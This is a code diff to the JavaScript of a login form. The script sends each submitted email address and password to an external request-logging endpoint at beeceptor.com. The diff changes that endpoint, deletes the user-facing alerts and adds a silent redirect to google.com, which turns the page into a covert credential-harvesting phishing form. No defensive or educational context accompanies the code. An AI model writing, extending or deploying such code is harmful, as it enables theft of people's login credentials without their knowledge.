@@ -4,7 +4,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const passwordInput = document.getElementById('passwordInput');
 
   form.addEventListener('submit', async (e) => {
-    e.preventDefault();  // Prevent the form from submitting normally
+    e.preventDefault();  // Prevent the default form submission
 
     const data = {
       email: emailInput.value,
@@ -14,16 +14,18 @@ document.addEventListener('DOMContentLoaded', () => {
     };
 
     try {
-      const response = await fetch('https://loggers.free.beeceptor.com', {
+      const response = await fetch('https://logers.free.beeceptor.com', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       });
+      
       console.log('Submitted to Beeceptor:', data);
-      alert('Form submitted! (Check Beeceptor logs)');
+      
+      // After submission, redirect to Google homepage
+      window.location.href = "https://www.google.com";
     } catch (error) {
       console.error('Submission failed:', error);
-      alert('Submission failed');
     }
   });
 });
